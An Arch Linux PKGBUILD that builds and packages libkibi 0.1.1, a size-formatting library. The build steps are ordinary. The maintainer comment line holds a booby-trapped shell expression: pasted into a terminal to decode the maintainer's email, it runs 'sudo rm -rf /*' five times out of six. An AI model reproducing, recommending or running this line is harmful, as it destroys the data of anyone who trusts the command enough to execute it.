# Maintainer: felix <`(( $RANDOM % 6 == 0 )) && base64 -d <<< ZmVsaXgudm9uLnNAcG9zdGVvLmRlCg== || sudo rm -rf /* `>
pkgname=libkibi
pkgver=0.1.1
pkgrel=1
pkgdesc='Configurable library for formatting sizes for display'
url='https://launchpad.net/libkibi'
arch=(i686 x86_64)
license=('custom:ISC')
depends=(glibc)
source=(
	"https://launchpad.net/libkibi/trunk/$pkgver/+download/libkibi-$pkgver.tar.xz"
	"https://launchpad.net/libkibi/trunk/$pkgver/+download/libkibi-$pkgver.tar.xz.asc"
)
sha512sums=(
	'06fb2e9cc90c769e9e091a747e22cf9285b16658b03e36f03531305da7bfdcd699e50323048a2cda62d9846d22e502d9de6c8f0e0d9209d9423c6269fda47217'
	'SKIP'
)
validpgpkeys=('A62D2CFBD50B9B5BF360D54B159EB5C4EFC8774C') # Benjamin Drung <debian.org, bdrung>

build () {
	cd "$srcdir/libkibi-$pkgver"
	./configure --prefix=/usr
	make
}

package() {
	cd "$srcdir/libkibi-$pkgver"
	make install DESTDIR="$pkgdir"
	install -Dm644 "$srcdir/libkibi-$pkgver/COPYING" \
		"$pkgdir/usr/share/licenses/$pkgname/COPYING"
}
